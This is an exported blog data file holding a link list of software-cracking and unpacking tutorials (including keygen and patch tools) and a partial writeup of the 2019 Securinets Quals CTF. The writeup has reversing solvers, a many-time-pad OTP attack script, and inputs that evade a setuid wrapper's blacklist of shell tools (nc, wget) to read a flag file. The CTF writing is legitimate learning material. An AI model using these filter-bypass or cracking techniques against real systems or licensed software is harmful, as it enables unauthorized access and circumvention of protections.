{"meta":{"title":"AssassinQ","subtitle":null,"description":"ZJGSU-IS-17","author":null,"url":"https://qianfei11.github.io"},"pages":[{"title":"about","date":"2018-04-19T06:24:25.000Z","updated":"2019-02-18T04:18:42.849Z","comments":true,"path":"about/index.html","permalink":"https://qianfei11.github.io/about/index.html","excerpt":"","text":"一名伪装成二进制选手的签到题菜鸡。 若有侵权，请联系邮箱assassinqkeepshumble@gmail.com。"},{"title":"tags","date":"2018-04-19T06:24:45.000Z","updated":"2018-04-19T06:49:25.974Z","comments":true,"path":"tags/index.html","permalink":"https://qianfei11.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"闭关学习","slug":"闭关学习","date":"2099-12-31T15:59:59.000Z","updated":"2019-03-07T07:23:58.448Z","comments":true,"path":"2099/12/31/闭关学习/","link":"","permalink":"https://qianfei11.github.io/2099/12/31/闭关学习/","excerpt":"(´･_･`)","text":"(´･_･`) 吾爱破解论坛教程《吾爱破解培训第一课：破解基础知识之介绍常见工具和壳的特征》 讲师：Hmily，链接：http://www.52pojie.cn/thread-378612-1-1.html《吾爱破解培训第二课：实战去广告、弹窗及主页锁定》 讲师：Kido，链接：http://www.52pojie.cn/thread-384195-1-1.html《吾爱破解培训第三课：改头换面之修改版权和资源》 讲师：Kido，链接：http://www.52pojie.cn/thread-389996-1-1.html《吾爱破解培训第四课：击破程序最坚固的堡垒–实战去程序自校验》 讲师：小生我怕怕，链接：http://www.52pojie.cn/thread-392395-1-1.html《吾爱破解培训第五课：反击作者的挑衅–实战解除程序重启验证》 讲师：我是用户，链接：http://www.52pojie.cn/thread-396068-1-1.html《吾爱破解培训第六课：潜伏在程序身边的黑影–实战给程序补丁》 讲师：我是用户，链接：http://www.52pojie.cn/thread-405758-1-1.html《吾爱破解培训第七课：手把手教你从实例看如何攻破常见的网络验证》 讲师：珈蓝夜雨，链接：http://www.52pojie.cn/thread-408475-1-1.html《吾爱破解培训第八课：短兵相接–深入浅出探讨脱壳细节（上）》 讲师：L4Nce，链接：http://www.52pojie.cn/thread-411104-1-1.html《吾爱破解培训第九课：短兵相接–深入浅出探讨脱壳细节（下）》 讲师：L4Nce，链接：http://www.52pojie.cn/thread-411104-1-1.html《吾爱破解培训第十课：探寻逆向新航标—x64平台脱壳与破解实战》 讲师：Kido，链接：http://www.52pojie.cn/thread-422192-1-1.html 樱花补丁制作工具：http://www.52pojie.cn/thread-62307-1-1.html内存补丁生成器：http://www.52pojie.cn/thread-162411-1-1.html注册机生成器：http://www.52pojie.cn/thread-159470-1-1.htmlIDA Pro v6.5：http://www.52pojie.cn/thread-284145-1-1.html破解工具包：http://www.52pojie.cn/thread-190698-1-1.html NO.1Hmily 【初学者教程】破解基础知识之认识壳与程序的特征。新手一看教程就在说程序破解应该先脱壳，那到底程序有没有加壳？加了什么壳？看看大H的文章你就懂了！http://www.52pojie.cn/thread-234739-1-1.html NO.2ximo 脱壳教程(24集全)http://pan.baidu.com/s/1cebVOU 密码: fxiahttp://down.52pojie.cn/吾爱破解视频教程/ximo脱壳基础.7z来自吾爱破解论坛LCG组织成员也是VMP脱壳插件作者ximo做的脱壳教程，堪称经典，入门脱壳必学！压缩包为7Z格式，7Z官方网站 NO.3小生我怕怕 脱壳练习系列附带对应文章的动画视频教程，方便学习交流脱壳知识。教程对应动画视频：http://www.52pojie.cn/thread-11642-1-1.html 吾爱专题脱壳练习一—-压缩壳练习之一:http://www.52pojie.cn/thread-10496-1-1.html吾爱专题脱壳练习二—-压缩壳练习之二:http://www.52pojie.cn/thread-10607-1-1.html吾爱专题脱壳练习三—-压缩壳练习之三:http://www.52pojie.cn/thread-10688-1-1.html吾爱破解脱壳练习四——简单加密壳:http://www.52pojie.cn/thread-10850-1-1.html吾爱专题脱壳练习五—-upx壳:http://www.52pojie.cn/thread-10990-1-1.html吾爱专题脱壳练习六—-TElock V0.99 :http://www.52pojie.cn/thread-11112-1-1.html吾爱专题脱壳练习七—-ORiEN:http://www.52pojie.cn/thread-11244-1-1.html吾爱专题脱壳练习八—-MoleBox V2.6.5:http://www.52pojie.cn/thread-11306-1-1.html吾爱专题脱壳练习九—-CRYPToCRACk’s PE Protector:http://www.52pojie.cn/thread-11446-1-1.html吾爱专题脱壳练习十—-PESpin 1.32：http://www.52pojie.cn/thread-11585-1-1.html吾爱专题脱壳练习十一—-VB自效验的处理:http://www.52pojie.cn/thread-11747-1-1.html吾爱专题脱壳练习十二—-delphi自效验的处理:http://www.52pojie.cn/thread-11883-1-1.html吾爱专题脱壳练习十三—-GHF Protector V1.0:http://www.52pojie.cn/thread-12011-1-1.html吾爱专题脱壳练习十四—-Armadillo 6.04：http://www.52pojie.cn/thread-12135-1-1.html吾爱专题脱壳练习十五—-ACProtector系列保护：http://www.52pojie.cn/thread-12279-1-1.html吾爱专题脱壳练习十六—-ACProtector系列保护：http://www.52pojie.cn/thread-12362-1-1.html吾爱专题脱壳练习十七—-PEBundle 2.0b5 - 3.0x：http://www.52pojie.cn/thread-12498-1-1.html吾爱专题脱壳练习十八—-Armadillo 4.40：http://www.52pojie.cn/thread-12620-1-1.html吾爱专题脱壳练习十九—-PUNiSHER 1.5：http://www.52pojie.cn/thread-12822-1-1.html吾爱专题脱壳练习二十—-未知壳一：http://www.52pojie.cn/thread-12936-1-1.html吾爱专题脱壳练习二十一—-未知壳二：http://www.52pojie.cn/thread-13494-1-1.html吾爱专题脱壳练习二十二—-未知壳三：http://www.52pojie.cn/thread-13770-1-1.html NO.4我是用户 破解实战(10集全)破解实战演练教程第一战:http://www.52pojie.cn/thread-197281-1-1.html第二战:http://www.52pojie.cn/thread-197598-1-1.html第三战:http://www.52pojie.cn/thread-197957-1-1.html第四战:http://www.52pojie.cn/thread-198203-1-1.html第五战:http://www.52pojie.cn/thread-198365-1-1.html第六战:http://www.52pojie.cn/thread-198930-1-1.html第七战:http://www.52pojie.cn/thread-199459-1-1.html第八战:http://www.52pojie.cn/thread-199834-1-1.html第九战:http://www.52pojie.cn/thread-200655-1-1.html第十战:http://www.52pojie.cn/thread-200798-1-1.html NO.5Blue .NET系列教程(4集全)图文教程分析.net程序！第一课 http://www.52pojie.cn/thread-248348-1-1.html第二课 http://www.52pojie.cn/thread-249034-1-1.html第三课 http://www.52pojie.cn/thread-250626-1-1.html第四课 http://www.52pojie.cn/thread-250633-1-1.html NO.6去软件弹窗系列教程(共两集)第一课 http://www.52pojie.cn/thread-316180-1-1.html第二课 http://www.52pojie.cn/thread-323346-1-1.html NO.7R4ndom破解教程全文翻译(共七集)第一课 http://www.52pojie.cn/thread-344925-1-1.html第二课 http://www.52pojie.cn/thread-345839-1-1.html第三课 http://www.52pojie.cn/thread-346455-1-1.html第四课 http://www.52pojie.cn/thread-350727-1-1.html第五课 http://www.52pojie.cn/thread-352818-1-1.html第六课 http://www.52pojie.cn/thread-354029-1-1.html第七课 http://www.52pojie.cn/thread-355207-1-1.html MIT-6.858-Computer-Systems-Security Introduction, Threat Models https://www.bilibili.com/video/av31206656 Control Hijacking Attacks https://www.bilibili.com/video/av31210358 Buffer Overflow Exploits and Defenses https://www.bilibili.com/video/av31210821 Privilege Separation https://www.bilibili.com/video/av31217861 Guest lecture by Paul Youn from iSEC Partners https://www.bilibili.com/video/av31211224 Capabilities https://www.bilibili.com/video/av31218352 Sandboxing Native Code https://www.bilibili.com/video/av31242204 Web Security Model https://www.bilibili.com/video/av31242476 Securing Web Applications https://www.bilibili.com/video/av31242761 Symbolic Execution https://www.bilibili.com/video/av31326165 Ur_Web https://www.bilibili.com/video/av31326760 Network Security https://www.bilibili.com/video/av31243615 HITCON 合集https://www.bilibili.com/video/av36680029（中文字幕版：https://www.bilibili.com/video/av24641279） 【weber tsai】ctf二进制基础https://www.bilibili.com/video/av17544215 【winesap】2015 計算機安全binary Day 1：https://www.bilibili.com/video/av17468979binary Day 2：https://www.bilibili.com/video/av17480824 【winesap】【ctf-pwn】asis3 2016训练视频https://www.bilibili.com/video/av17545357 【winesap】【ctf-pwn】stcs 2016week3：https://www.bilibili.com/video/av17481170week4：https://www.bilibili.com/video/av17481265week5：https://www.bilibili.com/video/av17481426week6：https://www.bilibili.com/video/av17481377week8：https://www.bilibili.com/video/av17482224week10：https://www.bilibili.com/video/av17482233week11：https://www.bilibili.com/video/av17482290week12：https://www.bilibili.com/video/av17482280week13：https://www.bilibili.com/video/av17482334final：https://www.bilibili.com/video/av17483585","categories":[],"tags":[{"name":"note","slug":"note","permalink":"https://qianfei11.github.io/tags/note/"}]},{"title":"2019-Securinets-Quals-writeup","slug":"【未完成】2019-Securinets-Quals-writeup","date":"2019-03-25T00:45:10.000Z","updated":"2019-03-27T03:26:38.637Z","comments":true,"path":"2019/03/25/【未完成】2019-Securinets-Quals-writeup/","link":"","permalink":"https://qianfei11.github.io/2019/03/25/【未完成】2019-Securinets-Quals-writeup/","excerpt":"比赛的时候做了四道题，顺便复现几道没做出来的题目。","text":"比赛的时候做了四道题，顺便复现几道没做出来的题目。 ReversingAutomateMe12root@91120f278fdd:~/ctf/2019-Securinets/re/AutomateMe# file ./bin ./bin: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=cbafec6cc96cbdd6feea8085adeeafb3fc05c11f, not stripped 用radare2分析一下： 12345678910111213141516171819202122232425262728293031root@91120f278fdd:~/ctf/2019-Securinets/re/AutomateMe# radare2 ./bin -- Execute commands on a temporary offset by appending &apos;@ offset&apos; to your command.[0x000005d0]&gt; aaa[Invalid instruction of 16368 bytes at 0x124 entry0 (aa)Invalid instruction of 16366 bytes at 0x124[x] Analyze all flags starting with sym. and entry0 (aa)[x] Analyze function calls (aac)[x] Analyze len bytes of instructions for references (aar)[x] Constructing a function name for fcn.* and sym.func.* functions (aan)...[x] Type matching analysis for all functions (aaft)[x] Use -AA or aaaa to perform additional experimental analysis.[0x000005d0]&gt; s main[0x000006da]&gt; pdfLinear size differs too much from the bbsum, please use pdr instead.[0x000006da]&gt; pdrDo you want to print 1316 lines? (y/N) y...| 0x00000786 3c68 cmp al, 0x68 ; &apos;h&apos;| ; DATA XREF from main (+0x173d3)| 0x00000788 7416 je 0x7a0| ----------- true: 0x000007a0 false: 0x0000078a| ; DATA XREF from main (+0x1742f)| 0x0000078a 488d3de57c02. lea rdi, str.nope_: ; 0x28476 ; &quot;nope :( &quot; ; const char *format| ; DATA XREF from main (+0x1758d)| 0x00000791 b800000000 mov eax, 0| ; DATA XREF from main (+0x17681)| 0x00000796 e815feffff call sym.imp.printf ; int printf(const char *format)| ; DATA XREF from main (+0x1776e)| 0x0000079b e9007c0200 jmp 0x283a0... 在0x00000786处可以看到将输入的某个字符与h进行了比较。 1234567891011121314151617181920...| ----------- true: 0x000283a0| ; CODE XREF from main (0x788)| ; DATA XREF from main (+0x17869)| 0x000007a0 488b45e0 mov rax, qword [s]| ; DATA XREF from main (+0x17928)| 0x000007a4 4883c008 add rax, 8| ; DATA XREF from main (+0x179e7)| 0x000007a8 488b00 mov rax, qword [rax]| ; DATA XREF from main (+0x17a86)| 0x000007ab 0fb64002 movzx eax, byte [rax + 2] ; [0x2:1]=76| ; DATA XREF from main (+0x17b4c)| 0x000007af 8845ff mov byte [local_1h], al| ; DATA XREF from main (+0x17bdd)| 0x000007b2 8075ffeb xor byte [local_1h], 0xeb| ; DATA XREF from main (+0x17ca3)| 0x000007b6 807dff8e cmp byte [local_1h], 0x8e| ; DATA XREF from main (+0x17d70)| 0x000007ba 7416 je 0x7d2... 往下看变得复杂了一些，将输入和0xeb异或了一下再与0x8e比较，故这里的字符是chr(0xeb^0x8e)=&#39;e&#39;。 事实证明，这道题用Ghidra很方便。这个文件的main函数非常大，ida都没法反编译。Ghidra可以快速地分析，然后我们通过python正则匹配一下就能得到flag： 正则匹配： 12345678910#!/usr/bin/env pythonimport rewith open('bin.c', 'rb') as f: txt = f.read() regex = re.compile(r'\\'(.*)\\'') # print regex.findall(txt) output = '' for c in regex.findall(txt): output += c print output 输出flag： 12$ ./solve.py | grep -E \"flag|securinets\"... here is you flag securinets&#123;automating_everything_is_the_new_future&#125; ... Warmup: Welcome to securinets CTF!12root@91120f278fdd:~/ctf/2019-Securinets/re/warmup# file warmup warmup: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=93a17fbbf5e51001a87144a35c32ea813c43cbf4, stripped ltrace一下，大概能看出做了什么： 123456789101112131415161718root@91120f278fdd:~/ctf/2019-Securinets# ltrace ./warmup puts(\"Welcome to securinets quals CTF \"...Welcome to securinets quals CTF :)) = 35printf(\"PASSCODE:\") = 9fgets(PASSCODE:ABC123\"ABC123\\n\", 100, 0x7f6912b8aa00) = 0x55e762c220e0strlen(\"ABC123\\n\") = 7...malloc(137) = 0x55e763504a80strlen(\"QUJDMTIzCgCA/gMAcP4AADhpAAABABBp\"...) = 136...strlen(\"QUJDMTIz\") = 8strlen(\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdef\"...) = 62...puts(\"NOPE :( \"NOPE :( ) = 9exit(0 &lt;no return ...&gt;+++ exited (status 0) +++ 放进ida里看看main函数： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; int length; // eax _BOOL4 v4; // ebx int v5; // ebx int v6; // ebx int v7; // ebx int v8; // ebx int v9; // ebx int v10; // ebx int v11; // ebx int v12; // ebx int v13; // ebx int v14; // ebx int v15; // ebx int v16; // ebx int v17; // ebx int v18; // ebx int v19; // ebx int v20; // ebx int v21; // ebx int v22; // ebx int v23; // ebx int v24; // ebx int v25; // ebx int v26; // ebx int v27; // ebx int i; // [rsp+8h] [rbp-1C8h] int j; // [rsp+Ch] [rbp-1C4h] char *s; // [rsp+18h] [rbp-1B8h] int v32[102]; // [rsp+20h] [rbp-1B0h] unsigned __int64 v33; // [rsp+1B8h] [rbp-18h] v33 = __readfsqword(0x28u); puts(\"Welcome to securinets quals CTF :)\"); printf(\"PASSCODE:\", a2); fgets(passcode, 100, stdin); for ( i = 0; i &lt; strlen(passcode); ++i ) v32[i] = passcode[i]; length = sub_89A(0x64u); s = (char *)malloc(length + 1); base64_encode((__int64)v32, 0x64u, (__int64)s); for ( j = 0; j &lt; strlen(s) &amp;&amp; s[j] != 'C'; ++j ) base64_string[j] = s[j]; base64_string[strlen(base64_string)] = 0; v4 = sub_B88(base64_string); v5 = (unsigned __int64)sub_C07(base64_string) + v4; v6 = (unsigned __int64)sub_C68((__int64)base64_string) + v5; v7 = (unsigned __int64)sub_E25(base64_string) + v6; v8 = (unsigned __int64)sub_C90(base64_string) + v7; v9 = (unsigned __int64)sub_CAD(base64_string) + v8; v10 = (unsigned __int64)sub_CDA(base64_string) + v9; v11 = (unsigned __int64)sub_DA8(base64_string) + v10; v12 = (unsigned __int64)sub_DF4(base64_string) + v11; v13 = (unsigned __int64)sub_E6E(base64_string) + v12; v14 = (unsigned __int64)sub_ECA(base64_string) + v13; v15 = (unsigned __int64)sub_EF7(base64_string) + v14; v16 = (unsigned __int64)sub_F53(base64_string) + v15; v17 = (unsigned __int64)sub_FAF(base64_string) + v16; v18 = (unsigned __int64)sub_E51(s) + v17; v19 = (unsigned __int64)sub_107E(base64_string) + v18; v20 = (unsigned __int64)sub_10AF(base64_string) + v19; v21 = (unsigned __int64)sub_10E0(base64_string) + v20; v22 = (unsigned __int64)sub_10FD(base64_string) + v21; v23 = (unsigned __int64)sub_112A(base64_string) + v22; v24 = (unsigned __int64)sub_11FB(base64_string) + v23; v25 = (unsigned __int64)sub_1234(base64_string) + v24; v26 = (unsigned __int64)sub_1287(base64_string) + v25; v27 = (unsigned __int64)sub_12B6(base64_string) + v26; if ( v27 + (unsigned int)sub_1309(base64_string) == 25 ) &#123; puts(\"Good job! u know what to do and submit!\"); &#125; else &#123; puts(\"NOPE :(\"); free(s); &#125; return 0LL;&#125; 一开始做了一个base64，然后一系列的没有规律的加密，我们所需要做的是耐心地倒退出来就行了。脚本： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#!/usr/bin/env pythonimport base64def pos(x,y): for i in range(len(y)): if y[i] == x: return itable = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'enc = [0] * 36enc[0] = ord(table[28])enc[3] = ord('j')enc[4] = enc[0] + 1enc[12] = enc[4] - 1enc[22] = enc[4] - 1enc[24] = enc[4] - 1enc[1] = ord(table[54])enc[2] = ord(table[((28 + pos(chr(enc[1]), table)) &gt;&gt; 2) + 1])enc[10] = enc[2]enc[6] = enc[3] - 32enc[7] = ord('p')enc[11] = 48enc[23] = 48enc[35] = enc[11] + 9enc[8] = enc[0] - 1 enc[27] = enc[4] + 2enc[31] = enc[27]enc[9] = enc[27] + 7enc[25] = enc[27] + 7enc[13] = enc[1] + 1 enc[17] = enc[1] + 1 enc[21] = enc[1] + 1 enc[15] = enc[7] + 3enc[14] = enc[15] + 1 enc[19] = ord('z')enc[34] = enc[0] - 33enc[5] = 88enc[20] = 88enc[29] = 88enc[33] = 88enc[26] = 49enc[16] = enc[9] - 32enc[28] = enc[16]enc[18] = enc[7] - 30enc[30] = enc[18]enc[32] = enc[4]flag = ''for i in enc: flag += chr(i)flag = base64.b64decode(flag)print 'flag:', flag CryptoUseless Admin题目说明了是OTP（一次一密），并且给了一个json，里面有用同一个密钥加密的不同密文，以及同样被加密的flag。 12345678910111213141516&#123; \"cipher_list\": [ \"1b0605000e14000d1b524802190b410700170e10054c11480807001806004e4f1f4f01480d411400531158141e1c100016535a480c000c031a000a160d421e004113010f13451e0c0100100a020a1a4e165f500d0c1e041a090b001d0515521c0a0410000a4f4b4d1d1c184d071600071c0a521d1706540940\", \"1e10524e001f11481c010010070b13024f0704590903094d0c000e4f0711000615001911454217161a1a45040149000a5218404f1e0012060b1b590a1048171741140c01174c0d49174f0c8d4fc7520211531b0b0c1e4f\", \"1d0c04451352001a000154431b014109450a0a0b000045490403520a1d16490008535848085942071c0d0c57101c0045111c40430c4e111c0b1b1c451d4f071712010508475518061d00060a1b0a1a4c165d\", \"160d074300061d071b524e06190b134e450a0b0a4d4c12411d004f014045491b4649074804001100011d4504520612451e165d53064e164e1d060d0d44541a0041031b0b06540d1a070004001d4b074800531c04101d4f\", \"1a1d524912521548120045021b4e1506490a0859150345531d12521b4e094909030003011148420453074d161e05540b071e4c451b000a084a1d1c04084c0b45060b060a4742070618534218070210484512020043100e191e5956111a1c001c1f0b5c\", \"1a1d5248000154041a1c47430d0b04000005015900140c4f04534f094e08490103000000045442111b11001b1b1d000917535a48004e021d4a0e0b0044491c03080a001a024c11490748074f02040054451a1d150c1b150d020d0e\", \"1a1d5249125215481613500a1b0f0d4e4d0d1c0d000700001d1c001b06004f1d0f5a11480745040a011100181c0c540d13000e44085404404a061716014e010c0308104e084e0d4911450506011853540a5304120a1a154c0a1843001b45541c481607051b431f480d001e0400000c531d01011d00124441010200190d0800000000000e54060001100a1b4d0b040d105347\", \"0a0607000913020d551300041d0f0f0a0003061f154c034f1b53530602004e0c030c541f0454110a1d5a001e0649190419165d00104f104e1b1a101101001b0b1705051b0642040c5341114f0e4b104f0803110b0a060f42\", \"160d074300061d071b524e06190b134e450a0b0a4d4c12411d004f014045491b4649074804001100011d4504520612451e165d53064e16424a1810110c00060d04440e1c02411c0c00544209001953540d165009021a1542\", \"1e10524e001f11481c010010070b13024f0704590903094d0c000e4f0711000615001911454217161a1a45040149000a5218404f1e0012060b1b590a1048171741140c01174c0d49174f4201001f534b0b1c074b\", \"1a49134d4113540a0713490d434e160f541700174f4c11480c53520a1d1100000000190d4549114512544d12000c540402034b4e0d491d40\" ], \"cipher_flag\": \"1a4905410f06110c55064f430a00054e540c0a591603174c0d5f000d1b110006414c1848164516111f1100111d1b54001c17474e0e001c011f1d0a4b\"&#125; 同时我找到了一篇2017年AlexCTF中类似的writeup，用的是github上的一个attack脚本。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687#!/usr/bin/env python## OTP - Recovering the private key from a set of messages that were encrypted w/ the same private key (Many time pad attack) - crypto100-many_time_secret @ alexctf 2017# @author intrd - http://dann.com.br/ # Original code by jwomers: https://github.com/Jwomers/many-time-pad-attack/blob/master/attack.py)import stringimport collectionsimport sets, sys# 11 unknown ciphertexts (in hex format), all encrpyted with the same keyc1 = '1b0605000e14000d1b524802190b410700170e10054c11480807001806004e4f1f4f01480d411400531158141e1c100016535a480c000c031a000a160d421e004113010f13451e0c0100100a020a1a4e165f500d0c1e041a090b001d0515521c0a0410000a4f4b4d1d1c184d071600071c0a521d1706540940'c2 = '1e10524e001f11481c010010070b13024f0704590903094d0c000e4f0711000615001911454217161a1a45040149000a5218404f1e0012060b1b590a1048171741140c01174c0d49174f0c8d4fc7520211531b0b0c1e4f'c3 = '1d0c04451352001a000154431b014109450a0a0b000045490403520a1d16490008535848085942071c0d0c57101c0045111c40430c4e111c0b1b1c451d4f071712010508475518061d00060a1b0a1a4c165d'c4 = '160d074300061d071b524e06190b134e450a0b0a4d4c12411d004f014045491b4649074804001100011d4504520612451e165d53064e164e1d060d0d44541a0041031b0b06540d1a070004001d4b074800531c04101d4f'c5 = '1a1d524912521548120045021b4e1506490a0859150345531d12521b4e094909030003011148420453074d161e05540b071e4c451b000a084a1d1c04084c0b45060b060a4742070618534218070210484512020043100e191e5956111a1c001c1f0b5c'c6 = '1a1d5248000154041a1c47430d0b04000005015900140c4f04534f094e08490103000000045442111b11001b1b1d000917535a48004e021d4a0e0b0044491c03080a001a024c11490748074f02040054451a1d150c1b150d020d0e'c7 = '1a1d5249125215481613500a1b0f0d4e4d0d1c0d000700001d1c001b06004f1d0f5a11480745040a011100181c0c540d13000e44085404404a061716014e010c0308104e084e0d4911450506011853540a5304120a1a154c0a1843001b45541c481607051b431f480d001e0400000c531d01011d00124441010200190d0800000000000e54060001100a1b4d0b040d105347'c8 = '0a0607000913020d551300041d0f0f0a0003061f154c034f1b53530602004e0c030c541f0454110a1d5a001e0649190419165d00104f104e1b1a101101001b0b1705051b0642040c5341114f0e4b104f0803110b0a060f42'c9 = '160d074300061d071b524e06190b134e450a0b0a4d4c12411d004f014045491b4649074804001100011d4504520612451e165d53064e16424a1810110c00060d04440e1c02411c0c00544209001953540d165009021a1542'c10 = '1e10524e001f11481c010010070b13024f0704590903094d0c000e4f0711000615001911454217161a1a45040149000a5218404f1e0012060b1b590a1048171741140c01174c0d49174f4201001f534b0b1c074b'c11 = '1a49134d4113540a0713490d434e160f541700174f4c11480c53520a1d1100000000190d4549114512544d12000c540402034b4e0d491d40'ciphers = [c1, c2, c3, c4, c5, c6, c7, c8, c9, c10, c11]# The target ciphertext we want to cracktarget_cipher = '1a4905410f06110c55064f430a00054e540c0a591603174c0d5f000d1b110006414c1848164516111f1100111d1b54001c17474e0e001c011f1d0a4b'# XORs two stringdef strxor(a, b): # xor two strings (trims the longer input) return \"\".join([chr(ord(x) ^ ord(y)) for (x, y) in zip(a, b)])# To store the final keyfinal_key = [None]*300# To store the positions we know are brokenknown_key_positions = set()# For each ciphertextfor current_index, ciphertext in enumerate(ciphers): counter = collections.Counter() # for each other ciphertext for index, ciphertext2 in enumerate(ciphers): if current_index != index: # don't xor a ciphertext with itself for indexOfChar, char in enumerate(strxor(ciphertext.decode('hex'), ciphertext2.decode('hex'))): # Xor the two ciphertexts # If a character in the xored result is a alphanumeric character, it means there was probably a space character in one of the plaintexts (we don't know which one) if char in string.printable and char.isalpha(): counter[indexOfChar] += 1 # Increment the counter at this index knownSpaceIndexes = [] # Loop through all positions where a space character was possible in the current_index cipher for ind, val in counter.items(): # If a space was found at least 7 times at this index out of the 9 possible XORS, then the space character was likely from the current_index cipher! if val &gt;= 7: knownSpaceIndexes.append(ind) #print knownSpaceIndexes # Shows all the positions where we now know the key! # Now Xor the current_index with spaces, and at the knownSpaceIndexes positions we get the key back! xor_with_spaces = strxor(ciphertext.decode('hex'),' '*300) for index in knownSpaceIndexes: # Store the key's value at the correct position final_key[index] = xor_with_spaces[index].encode('hex') # Record that we known the key at this position known_key_positions.add(index)# Construct a hex key from the currently known key, adding in '00' hex chars where we do not know (to make a complete hex string)final_key_hex = ''.join([val if val is not None else '00' for val in final_key])# Xor the currently known key with the target cipheroutput = strxor(target_cipher.decode('hex'),final_key_hex.decode('hex'))print \"Fix this sentence:\"print ''.join([char if index in known_key_positions else '*' for index, char in enumerate(output)])+\"\\n\"# WAIT.. MANUAL STEP HERE # This output are printing a * if that character is not known yet# fix the missing characters like this: \"Let*M**k*ow if *o&#123;*a\" = \"cure, Let Me know if you a\"# if is too hard, change the target_cipher to another one and try again# and we have our key to fix the entire text!#sys.exit(0) #comment and continue if u got a good key#target_plaintext = \"cure, Let Me know if you a\"target_plaintext = \"i wanted to end the world, but i'll settle for ending yours.\"print \"Fixed:\"print target_plaintext+\"\\n\"key = strxor(target_cipher.decode('hex'),target_plaintext)print \"Decrypted msg:\"for cipher in ciphers: print strxor(cipher.decode('hex'),key)print \"\\nPrivate key recovered: \"+key+\"\\n\" 具体原理应该就是异或了，只需要想办法复原key即可。我还找到一个cli工具，让还原key更简单，截图如下： PwnWelcome给了个ssh，然后无法执行welcome以及查看flag.txt： 1234567891011121314151617$ pwd/home/welcome$ whoamiwelcome$ ls -altotal 56dr-xr-xr-x 2 welcome welcome 4096 Mar 23 20:23 .drwxr-xr-x 22 root root 4096 Mar 24 10:18 ..-rw-r--r-- 1 root root 0 Mar 25 02:13 .bash_history-rw-r--r-- 1 welcome welcome 0 Mar 24 00:22 .bash_logout-rw-r--r-- 1 welcome welcome 1 Mar 24 13:33 .bashrc-rw-r--r-- 1 welcome welcome 655 May 16 2017 .profile-r-------- 1 welcome-cracked welcome-cracked 76 Mar 23 20:23 flag.txt-r--------+ 1 welcome-cracked welcome 8712 Mar 23 19:09 welcome-rw-r----- 1 root root 175 Mar 23 12:27 welcome.c-r-s--x--- 1 welcome-cracked welcome 13088 Mar 23 20:13 wrapper-rw-r--r-- 1 root root 1741 Mar 23 20:13 wrapper.c wrapper是可以执行的，源码也能查看，可以大致看看做了什么： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768/* author : Anis_Boss */#include &lt;stdio.h&gt;int search(char str[], char word[])&#123; int l, i, j; /*length of word */ for (l = 0; word[l] != '\\0'; l++); for (i = 0, j = 0; str[i] != '\\0' &amp;&amp; word[j] != '\\0'; i++) &#123; if (str[i] == word[j]) &#123; j++; &#125; else &#123; j = 0; &#125; &#125; if (j == l) &#123; /* substring found */ return (i - j); &#125; else &#123; return - 1; &#125;&#125;int delete_word(char str[], char word[], int index)&#123; int i, l; /* length of word */ for (l = 0; word[l] != '\\0'; l++); for (i = index; str[i] != '\\0'; i++) &#123; str[i] = str[i + l + 1]; &#125;&#125;void main(int argc, char* argv[])&#123;char * blacklist[]=&#123;\"cat\",\"head\",\"less\",\"more\",\"cp\",\"man\",\"scp\",\"xxd\",\"dd\",\"od\",\"python\",\"perl\",\"ruby\",\"tac\",\"rev\",\"xz\",\"tar\",\"zip\",\"gzip\",\"mv\",\"flag\",\"txt\",\"python\",\"perl\",\"vi\",\"vim\",\"nano\",\"pico\",\"awk\",\"grep\",\"egrep\",\"echo\",\"find\",\"exec\",\"eval\",\"regexp\",\"tail\",\"head\",\"less\",\"cut\",\"tr\",\"pg\",\"du\",\"`\",\"$\",\"(\",\")\",\"#\",\"bzip2\",\"cmp\",\"split\",\"paste\",\"diff\",\"fgrep\",\"gawk\",\"iconv\",\"ln\",\"most\",\"open\",\"print\",\"read\",\"&#123;\",\"&#125;\",\"sort\",\"uniq\",\"tee\",\"wget\",\"nc\",\"hexdump\",\"HOSTTYPE\",\"$\",\"arch\",\"env\",\"tmp\",\"dev\",\"shm\",\"lock\",\"run\",\"var\",\"snap\",\"nano\",\"read\",\"readlink\",\"zcat\",\"tailf\",\"zcmp\",\"zdiff\",\"zegrep\",\"zdiff\"&#125;; char str[80], word[50]; int index; printf(\"Welcome to Securinets Quals CTF \\o/ \\n\"); printf(\"Enter string:\\n\"); read(0,str,79);for (int i=0;i&lt;sizeof(blacklist)/sizeof(blacklist[0]);i++)&#123; index = search(str, blacklist[i]); if (index != - 1) &#123; delete_word(str, blacklist[i], index); &#125;&#125;setreuid(geteuid(),geteuid());close(0);system(str);&#125; 我们需要做的就是想办法绕过blacklist，然后。基础绕过方式： 12345welcome@vps614257:~$ ./wrapper Welcome to Securinets Quals CTF o/ Enter string:catccat flagfflag.txtttxtsecurinets&#123;who_needs_exec_flag_when_you_have_linker_reloaded_last_time!!!?&#125; 进阶绕过方式，利用*通配： 12345welcome@vps614257:~$ ./wrapper Welcome to Securinets Quals CTF o/ Enter string:/bin/ca* fla*securinets&#123;who_needs_exec_flag_when_you_have_linker_reloaded_last_time!!!?&#125; 高级绕过方式，sed正则匹配： 12345welcome@vps614257:~$ ./wrapper Welcome to Securinets Quals CTF o/ Enter string:sed 'r *' fla*securinets&#123;who_needs_exec_flag_when_you_have_linker_reloaded_last_time!!!?&#125; 或者： 12345welcome@vps614257:~$ ./wrapper Welcome to Securinets Quals CTF o/ Enter string:sed -u '' fla*securinets&#123;who_needs_exec_flag_when_you_have_linker_reloaded_last_time!!!?&#125; 官方给的wp： 123456welcome@vps614257:~$ ./wrapper Welcome to Securinets Quals CTF o/ Enter string:sed -u '' fla*/lib64/ld-linux-x86-64.so.2 ./welcomesecurinets&#123;who_needs_exec_flag_when_you_have_linker_reloaded_last_time!!!?&#125; Baby one1234567$ checksec ./baby1 [*] 